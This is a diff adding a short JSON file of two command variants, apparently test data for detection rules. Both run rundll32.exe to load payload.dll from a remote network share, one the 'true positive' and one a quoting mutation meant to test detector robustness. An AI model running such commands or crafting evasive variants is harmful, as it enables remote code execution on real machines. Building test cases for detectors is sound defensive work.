@@ -1,0 +1,10 @@
+[
+  {
+    "output": "rundll32.exe //192.168.1.1/share/payload.dll,EntryPoint",
+    "explanation": "This is the original true positive command and does not require mutation for testing purposes."
+  },
+  {
+    "output": "rundll32.exe '//192.168.1.1/share/payload.dll',EntryPoint",
+    "explanation": "Single quotes are used instead of double quotes to enclose the UNC path, which is a valid syntax substitution."
+  }
+]
